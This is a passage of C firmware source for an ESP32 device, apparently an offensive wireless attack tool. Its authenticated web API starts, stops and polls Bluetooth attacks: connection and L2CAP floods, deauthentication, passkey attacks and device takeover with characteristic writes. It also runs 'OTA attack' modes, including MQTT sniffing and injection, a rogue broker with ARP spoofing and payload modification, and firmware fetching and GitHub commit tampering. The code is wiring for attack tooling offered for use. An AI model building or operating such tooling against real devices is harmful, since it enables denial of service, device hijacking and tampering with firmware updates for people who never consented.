        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_connect_flood_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_connect_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_connect_flood_stop();
    return send_success_response(req);
}

static esp_err_t ble_connect_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    cJSON *status = ble_connect_flood_get_status_json();
    return send_json_response(req, status);
}

static esp_err_t ble_l2cap_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_l2cap_flood_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_l2cap_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_l2cap_flood_stop();
    return send_success_response(req);
}

static esp_err_t ble_l2cap_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    cJSON *status = ble_l2cap_flood_get_status_json();
    return send_json_response(req, status);
}

static esp_err_t ble_gatt_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_gatt_probe_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_gatt_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_gatt_probe_stop();
    return send_success_response(req);
}

static esp_err_t ble_gatt_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    cJSON *status = ble_gatt_probe_get_status_json();
    return send_json_response(req, status);
}

static esp_err_t ble_deauth_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_deauth_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_deauth_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_deauth_stop();
    return send_success_response(req);
}

static esp_err_t ble_deauth_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    cJSON *status = ble_deauth_get_status_json();
    return send_json_response(req, status);
}

static esp_err_t ble_scan_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *result = ble_scan_perform(5000);
    if (result == NULL) result = cJSON_CreateArray();
    return send_json_response(req, result);
}

static esp_err_t ble_status_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *response = cJSON_CreateObject();
    if (response == NULL) {
        return send_json_response(req, response);
    }
    cJSON_AddBoolToObject(response, "running", attack_bt_spam_is_running());
    return send_json_response(req, response);
}

/* ---- BLE Passkey Handlers ---- */

static esp_err_t ble_passkey_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_passkey_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_passkey_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_passkey_stop();
    return send_success_response(req);
}

static esp_err_t ble_passkey_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    cJSON *pk_root = cJSON_CreateObject();
    cJSON_AddBoolToObject(pk_root, "running", ble_passkey_is_running());
    cJSON_AddStringToObject(pk_root, "method", ble_passkey_get_method());
    char *pk_json = cJSON_PrintUnformatted(pk_root);
    httpd_resp_sendstr(req, pk_json);
    free(pk_json);
    cJSON_Delete(pk_root);
    return ESP_OK;
}

/* ---- BLE Takeover Handlers ---- */

static esp_err_t ble_takeover_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_takeover_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_takeover_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_takeover_stop();
    return send_success_response(req);
}

static esp_err_t ble_takeover_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    cJSON *to_root = cJSON_CreateObject();
    cJSON_AddBoolToObject(to_root, "running", ble_takeover_is_running());
    cJSON_AddNumberToObject(to_root, "state", ble_takeover_get_state());
    char *to_json = cJSON_PrintUnformatted(to_root);
    httpd_resp_sendstr(req, to_json);
    free(to_json);
    cJSON_Delete(to_root);
    return ESP_OK;
}

static esp_err_t ble_takeover_services_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ble_takeover_get_services_json());
    return ESP_OK;
}

static esp_err_t ble_takeover_read_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[128];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *handle_json = cJSON_GetObjectItem(root, "handle");
    if (!cJSON_IsNumber(handle_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing handle");
        return ESP_FAIL;
    }
    ble_takeover_read_chr((uint16_t)handle_json->valueint);
    cJSON_Delete(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ble_takeover_get_read_result());
    return ESP_OK;
}

static esp_err_t ble_takeover_write_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[512];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *handle_json = cJSON_GetObjectItem(root, "handle");
    cJSON *value_json = cJSON_GetObjectItem(root, "value");
    if (!cJSON_IsNumber(handle_json) || !cJSON_IsString(value_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing handle or value");
        return ESP_FAIL;
    }
    bool ok = ble_takeover_write_chr((uint16_t)handle_json->valueint, value_json->valuestring);
    cJSON_Delete(root);
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ble_takeover_notify_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[128];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *handle_json = cJSON_GetObjectItem(root, "handle");
    cJSON *enable_json = cJSON_GetObjectItem(root, "enable");
    if (!cJSON_IsNumber(handle_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing handle");
        return ESP_FAIL;
    }
    bool enable = cJSON_IsBool(enable_json) ? enable_json->valueint : true;
    bool ok = ble_takeover_enable_notify((uint16_t)handle_json->valueint, enable);
    cJSON_Delete(root);
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ble_takeover_notifs_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ble_takeover_get_notifications_json());
    return ESP_OK;
}


static bool ota_any_active(void)
{
    return ota_mqtt_sniff_is_active() || ota_inject_is_active() || ota_fetch_is_active() ||
           ota_poll_sniff_is_active() || ota_provision_is_active() || ota_github_is_active() ||
           ota_rogue_broker_is_active() || ota_fw_analyze_is_active();
}

static void ota_stop_all(void)
{
    ota_mqtt_sniff_stop();
    ota_inject_stop();
    ota_fetch_stop();
    ota_poll_sniff_stop();
    ota_provision_stop();
    ota_github_stop();
    ota_rogue_broker_stop();
    ota_fw_analyze_stop();
}

/* ================================================================== */
/*  OTA ATTACK HANDLERS                                                */
/* ================================================================== */

static esp_err_t ota_start_with_mode(httpd_req_t *req, int forced_mode) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[1024];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    int mode = forced_mode;
    if (mode < 0) {
        cJSON *mode_json = cJSON_GetObjectItem(root, "mode");
        if (!cJSON_IsNumber(mode_json) || mode_json->valueint < 0 || mode_json->valueint > 8) {
            cJSON_Delete(root);
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid or missing mode (0-8)");
            return ESP_FAIL;
        }
        mode = mode_json->valueint;
    }

    char wifi_ssid[33] = "";
    char wifi_password[64] = "";
    cJSON *ssid_json = cJSON_GetObjectItem(root, "wifi_ssid");
    cJSON *pass_json = cJSON_GetObjectItem(root, "wifi_password");
    if (cJSON_IsString(ssid_json)) strncpy(wifi_ssid, ssid_json->valuestring, sizeof(wifi_ssid) - 1);
    if (cJSON_IsString(pass_json)) strncpy(wifi_password, pass_json->valuestring, sizeof(wifi_password) - 1);

    cJSON *timeout_json = cJSON_GetObjectItem(root, "timeout_sec");
    uint32_t timeout_sec = cJSON_IsNumber(timeout_json) ? (uint32_t)timeout_json->valueint : 300;

    esp_err_t err = ESP_FAIL;

    if (mode == 0 || mode == 1) {
        /* mode 0 SNIFF: MQTT + promiscuous DNS/HTTP; mode 1 CLIENT: MQTT subscribe only */
        ota_mqtt_sniff_config_t cfg = {0};
        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
        cJSON *broker = cJSON_GetObjectItem(root, "mqtt_broker");
        cJSON *port = cJSON_GetObjectItem(root, "mqtt_port");
        cJSON *user = cJSON_GetObjectItem(root, "mqtt_username");
        cJSON *mpass = cJSON_GetObjectItem(root, "mqtt_password");
        cJSON *sub = cJSON_GetObjectItem(root, "subscribe_topic");
        if (cJSON_IsString(broker)) strncpy(cfg.mqtt_broker, broker->valuestring, sizeof(cfg.mqtt_broker) - 1);
        cfg.mqtt_port = cJSON_IsNumber(port) ? (uint16_t)port->valueint : 1883;
        if (cJSON_IsString(user)) strncpy(cfg.mqtt_username, user->valuestring, sizeof(cfg.mqtt_username) - 1);
        if (cJSON_IsString(mpass)) strncpy(cfg.mqtt_password, mpass->valuestring, sizeof(cfg.mqtt_password) - 1);
        if (cJSON_IsString(sub)) strncpy(cfg.subscribe_topic, sub->valuestring, sizeof(cfg.subscribe_topic) - 1);
        else strncpy(cfg.subscribe_topic, "#", sizeof(cfg.subscribe_topic) - 1);
        cfg.enable_promiscuous = (mode == 0);
        cfg.capture_dns = (mode == 0);
        cfg.capture_http = (mode == 0);
        cfg.timeout_sec = timeout_sec;
        err = ota_mqtt_sniff_start(&cfg);
    } else if (mode == 2) {
        ota_inject_config_t cfg = {0};
        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
        cJSON *broker = cJSON_GetObjectItem(root, "mqtt_broker");
        cJSON *port = cJSON_GetObjectItem(root, "mqtt_port");
        cJSON *user = cJSON_GetObjectItem(root, "mqtt_username");
        cJSON *itopic = cJSON_GetObjectItem(root, "inject_topic");
        cJSON *ipayload = cJSON_GetObjectItem(root, "inject_payload");
        cJSON *icount = cJSON_GetObjectItem(root, "inject_count");
        cJSON *iinterval = cJSON_GetObjectItem(root, "inject_interval_ms");
        if (cJSON_IsString(broker)) strncpy(cfg.mqtt_broker, broker->valuestring, sizeof(cfg.mqtt_broker) - 1);
        cfg.mqtt_port = cJSON_IsNumber(port) ? (uint16_t)port->valueint : 1883;
        if (cJSON_IsString(user)) strncpy(cfg.mqtt_username, user->valuestring, sizeof(cfg.mqtt_username) - 1);
        if (cJSON_IsString(itopic)) strncpy(cfg.inject_topic, itopic->valuestring, sizeof(cfg.inject_topic) - 1);
        if (cJSON_IsString(ipayload)) strncpy(cfg.inject_payload, ipayload->valuestring, sizeof(cfg.inject_payload) - 1);
        cfg.inject_count = cJSON_IsNumber(icount) ? (uint32_t)icount->valueint : 1;
        cfg.inject_interval_ms = cJSON_IsNumber(iinterval) ? (uint32_t)iinterval->valueint : 0;
        cfg.timeout_sec = timeout_sec;
        err = ota_inject_start(&cfg);
    } else if (mode == 3) {
        ota_fetch_config_t cfg = {0};
        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
        cJSON *fw = cJSON_GetObjectItem(root, "firmware_url");
        cJSON *ssl = cJSON_GetObjectItem(root, "verify_ssl");
        if (cJSON_IsString(fw)) strncpy(cfg.firmware_url, fw->valuestring, sizeof(cfg.firmware_url) - 1);
        cfg.verify_ssl = cJSON_IsBool(ssl) ? ssl->valueint : false;
        cfg.url_index = -1;
        cfg.timeout_sec = timeout_sec;
        err = ota_fetch_start(&cfg);
    } else if (mode == 4) {
        ota_poll_sniff_config_t cfg = {0};
        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
        cJSON *cap_dns = cJSON_GetObjectItem(root, "capture_dns");
        cJSON *cap_http = cJSON_GetObjectItem(root, "capture_http");
        cJSON *devip = cJSON_GetObjectItem(root, "target_device_ip");
        cfg.capture_dns = cJSON_IsBool(cap_dns) ? cap_dns->valueint : true;
        cfg.capture_http = cJSON_IsBool(cap_http) ? cap_http->valueint : true;
        if (cJSON_IsArray(devip) && cJSON_GetArraySize(devip) == 4) {
            for (int i = 0; i < 4; i++) {
                cJSON *b = cJSON_GetArrayItem(devip, i);
                if (cJSON_IsNumber(b)) cfg.target_device_ip[i] = (uint8_t)b->valueint;
            }
        }
        cfg.timeout_sec = timeout_sec;
        err = ota_poll_sniff_start(&cfg);
    } else if (mode == 5) {
        ota_github_config_t cfg = {0};
        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
        cJSON *broker = cJSON_GetObjectItem(root, "mqtt_broker");
        cJSON *port = cJSON_GetObjectItem(root, "mqtt_port");
        cJSON *gh_path = cJSON_GetObjectItem(root, "gh_firmware_path");
        cJSON *gh_branch = cJSON_GetObjectItem(root, "gh_branch");
        cJSON *gh_msg = cJSON_GetObjectItem(root, "gh_commit_msg");
        cJSON *gh_idx = cJSON_GetObjectItem(root, "gh_captured_url_index");
        if (cJSON_IsString(broker)) strncpy(cfg.mqtt_broker, broker->valuestring, sizeof(cfg.mqtt_broker) - 1);
        cfg.mqtt_port = cJSON_IsNumber(port) ? (uint16_t)port->valueint : 1883;
        strncpy(cfg.subscribe_topic, "#", sizeof(cfg.subscribe_topic) - 1);
        if (cJSON_IsString(gh_path)) strncpy(cfg.gh_firmware_path, gh_path->valuestring, sizeof(cfg.gh_firmware_path) - 1);
        if (cJSON_IsString(gh_branch)) strncpy(cfg.gh_branch, gh_branch->valuestring, sizeof(cfg.gh_branch) - 1);
        if (cJSON_IsString(gh_msg)) strncpy(cfg.gh_commit_msg, gh_msg->valuestring, sizeof(cfg.gh_commit_msg) - 1);
        cfg.gh_captured_url_index = cJSON_IsNumber(gh_idx) ? gh_idx->valueint : -1;
        cfg.timeout_sec = timeout_sec;
        err = ota_github_start(&cfg);
    } else if (mode == 6) {
        ota_provision_config_t cfg = {0};
        cJSON *channel = cJSON_GetObjectItem(root, "channel");
        cJSON *ports = cJSON_GetObjectItem(root, "ports");
        cJSON *max_bytes = cJSON_GetObjectItem(root, "max_pcap_bytes");
        cfg.channel = cJSON_IsNumber(channel) ? (uint8_t)channel->valueint : 1;
        cfg.max_pcap_bytes = cJSON_IsNumber(max_bytes)
                                 ? (uint32_t)max_bytes->valuedouble
                                 : OTA_PROV_DEFAULT_PCAP_BYTES;
        if (cJSON_IsArray(ports)) {
            int count = cJSON_GetArraySize(ports);
            if (count > OTA_PROV_MAX_PORTS) count = OTA_PROV_MAX_PORTS;
            for (int i = 0; i < count; i++) {
                cJSON *port = cJSON_GetArrayItem(ports, i);
                if (cJSON_IsNumber(port) && port->valueint > 0 &&
                    port->valueint <= 65535) {
                    cfg.ports[cfg.port_count++] = (uint16_t)port->valueint;
                }
            }
        }
        if (cfg.port_count == 0) {
            cfg.ports[0] = 80;
            cfg.port_count = 1;
        }
        cfg.timeout_sec = timeout_sec;
        err = ota_provision_start(&cfg);
    } else if (mode == 7) {
        ota_rogue_broker_config_t cfg = {0};
        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
        cJSON *broker = cJSON_GetObjectItem(root, "mqtt_broker");
        cJSON *rb_broker = cJSON_GetObjectItem(root, "rb_real_broker_ip");
        cJSON *rb_port = cJSON_GetObjectItem(root, "rb_real_broker_port");
        cJSON *rb_rogue = cJSON_GetObjectItem(root, "rb_rogue_port");
        cJSON *rb_mod = cJSON_GetObjectItem(root, "rb_modify_payloads");
        cJSON *rb_topic = cJSON_GetObjectItem(root, "rb_modify_topic");
        cJSON *rb_payload = cJSON_GetObjectItem(root, "rb_modify_payload");
        cJSON *rb_arp = cJSON_GetObjectItem(root, "rb_arp_spoof");
        if (cJSON_IsString(broker)) strncpy(cfg.mqtt_broker, broker->valuestring, sizeof(cfg.mqtt_broker) - 1);
        if (cJSON_IsString(rb_broker)) strncpy(cfg.real_broker_ip, rb_broker->valuestring, sizeof(cfg.real_broker_ip) - 1);
        cfg.real_broker_port = cJSON_IsNumber(rb_port) ? (uint16_t)rb_port->valueint : 1883;
        cfg.rogue_port = cJSON_IsNumber(rb_rogue) ? (uint16_t)rb_rogue->valueint : 1883;
        cfg.modify_payloads = cJSON_IsBool(rb_mod) ? rb_mod->valueint : false;
        if (cJSON_IsString(rb_topic)) strncpy(cfg.modify_topic, rb_topic->valuestring, sizeof(cfg.modify_topic) - 1);
        if (cJSON_IsString(rb_payload)) strncpy(cfg.modify_payload, rb_payload->valuestring, sizeof(cfg.modify_payload) - 1);
        cfg.arp_spoof = cJSON_IsBool(rb_arp) ? rb_arp->valueint : true;
        cfg.timeout_sec = timeout_sec;
        err = ota_rogue_broker_start(&cfg);
    } else if (mode == 8) {
        ota_fw_analyze_config_t cfg = {0};
        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
        cJSON *fw = cJSON_GetObjectItem(root, "firmware_url");
        cJSON *idx = cJSON_GetObjectItem(root, "fw_analyze_url_index");
        cJSON *deep = cJSON_GetObjectItem(root, "fw_deep_scan");
        cJSON *strings = cJSON_GetObjectItem(root, "fw_extract_strings");
        if (cJSON_IsString(fw)) strncpy(cfg.firmware_url, fw->valuestring, sizeof(cfg.firmware_url) - 1);
        cfg.url_index = cJSON_IsNumber(idx) ? idx->valueint : -1;
        cfg.deep_scan = cJSON_IsBool(deep) ? deep->valueint : true;
        cfg.extract_strings = cJSON_IsBool(strings) ? strings->valueint : true;
        cfg.timeout_sec = timeout_sec;
        err = ota_fw_analyze_start(&cfg);
    }

    cJSON_Delete(root);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OTA start failed");
        return ESP_FAIL;
    }
    return send_success_response(req);
}

static esp_err_t ota_start_handler(httpd_req_t *req) {
    return ota_start_with_mode(req, -1);
}

static esp_err_t ota_sniff_start_handler(httpd_req_t *req) {
    return ota_start_with_mode(req, 0);
}

static esp_err_t ota_inject_start_handler(httpd_req_t *req) {
    return ota_start_with_mode(req, 2);
}

static esp_err_t ota_fetch_start_handler(httpd_req_t *req) {
    return ota_start_with_mode(req, 3);
}

static esp_err_t ota_poll_start_handler(httpd_req_t *req) {
    return ota_start_with_mode(req, 4);
}

static esp_err_t ota_github_start_handler(httpd_req_t *req) {
    return ota_start_with_mode(req, 5);
}

static esp_err_t ota_provision_start_handler(httpd_req_t *req) {
    return ota_start_with_mode(req, 6);
}

static esp_err_t ota_rogue_broker_start_handler(httpd_req_t *req) {
    return ota_start_with_mode(req, 7);
}

static esp_err_t ota_firmware_start_handler(httpd_req_t *req) {
    return ota_start_with_mode(req, 8);
}

static esp_err_t ota_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Stopping OTA attack");
    ota_stop_all();
    return send_success_response(req);
}

static esp_err_t ota_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = NULL;
    if (ota_mqtt_sniff_is_active()) status = ota_mqtt_sniff_get_status_json();
    else if (ota_inject_is_active()) status = ota_inject_get_status_json();
    else if (ota_fetch_is_active()) status = ota_fetch_get_status_json();
    else if (ota_poll_sniff_is_active()) status = ota_poll_sniff_get_status_json();
    else if (ota_provision_is_active()) status = ota_provision_get_status_json();
    else if (ota_github_is_active()) status = ota_github_get_status_json();
    else if (ota_rogue_broker_is_active()) status = ota_rogue_broker_get_status_json();
    else if (ota_fw_analyze_is_active()) status = ota_fw_analyze_get_status_json();

    if (!status) {
        status = cJSON_CreateObject();
        cJSON_AddBoolToObject(status, "running", false);
        cJSON_AddBoolToObject(status, "active", false);
        cJSON_AddStringToObject(status, "state", "idle");
        cJSON_AddNumberToObject(status, "mqtt_msg_count", ota_common_get_mqtt_msg_count());
        cJSON_AddNumberToObject(status, "url_count", ota_common_get_url_count());
        cJSON_AddNumberToObject(status, "github_url_count", ota_common_get_github_url_count());
    } else {
        cJSON_AddBoolToObject(status, "running", true);
        cJSON_AddNumberToObject(status, "mqtt_msg_count", ota_common_get_mqtt_msg_count());
        cJSON_AddNumberToObject(status, "url_count", ota_common_get_url_count());
        cJSON_AddNumberToObject(status, "github_url_count", ota_common_get_github_url_count());
    }
    return send_json_response(req, status);
}

static esp_err_t ota_messages_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_common_get_messages_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "[]");
    return ESP_OK;
}

static esp_err_t ota_urls_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_common_get_urls_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "[]");
    return ESP_OK;
}

static esp_err_t ota_github_urls_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_github_get_urls_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "[]");
    return ESP_OK;
}

static esp_err_t ota_inject_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[768];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *topic_json   = cJSON_GetObjectItem(root, "topic");
    cJSON *payload_json = cJSON_GetObjectItem(root, "payload");
    if (!cJSON_IsString(topic_json) || !cJSON_IsString(payload_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing topic or payload");
        return ESP_FAIL;
    }

    bool ok = ota_inject_message(topic_json->valuestring, payload_json->valuestring);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ota_download_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[256];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
